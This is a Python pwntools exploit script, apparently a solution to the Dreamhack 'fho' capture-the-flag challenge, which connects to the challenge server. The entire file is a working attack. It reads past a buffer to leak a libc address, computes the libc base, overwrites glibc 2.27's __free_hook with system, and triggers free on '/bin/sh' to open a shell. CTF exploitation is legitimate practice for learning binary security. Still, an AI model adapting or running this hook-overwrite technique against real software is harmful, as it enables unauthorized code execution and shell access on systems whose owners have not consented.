#!/usr/bin/env python3

from pwn import *

exe = ELF("./fho_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("host1.dreamhack.games", 23086)

# input()

rw_section = 0x555555601800
p.sendafter(b'Buf: ', b'a'*0x48)
p.recvuntil(b'a'*0x48)
libc_leak = u64(p.recv(6) + b'\0\0')
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x21bf7
print("Libc base: " + hex(libc.address))

p.sendlineafter(b'write: ', str(libc.sym['__free_hook']))
p.sendlineafter(b'With: ', str(libc.sym['system']))
p.sendlineafter(b'free: ', str(next(libc.search(b'/bin/sh'))))

p.interactive()